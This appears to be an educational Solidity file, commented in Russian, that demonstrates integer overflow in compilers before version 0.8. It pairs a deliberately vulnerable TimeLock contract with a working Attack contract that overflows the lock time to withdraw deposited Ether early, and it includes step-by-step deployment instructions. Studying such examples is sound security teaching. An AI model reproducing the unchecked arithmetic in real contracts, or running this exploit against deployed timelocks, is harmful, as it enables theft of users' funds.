/*
Арифметическое переполнение и потеря значимости
Уязвимость
Прочность < 0,8
Целые числа в Solidity overflow/underflow без ошибок

Прочность >= 0,8
Поведение Solidity 0.8 по умолчанию при переполнении/недостаточном переполнении — выдавать ошибку.*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
// Этот контракт предназначен для использования в качестве хранилища времени.
// Пользователь может вносить средства в этот контракт, 
//но не может снимать средства в течение как минимум недели.
// Пользователь также может продлить время ожидания сверх периода ожидания в 1 неделю.

/*
1. Разверните TimeLock
2. Развернуть атаку с адресом TimeLock
3. Call Attack.attack отправив 1 эфир. Вы сразу сможете
    вывести свой эфир.

Что случилось?
Атака вызвала переполнение TimeLock.lockTime и возможность снятия
до 1 недели ожидания.
*/

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
       /*
         если t = текущее время блокировки, то нам нужно найти такое x, что
         х + т = 2**256 = 0
         так что х = -t
         2**256 = тип(uint).max + 1
         поэтому x = тип (uint).max + 1 - t
         */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
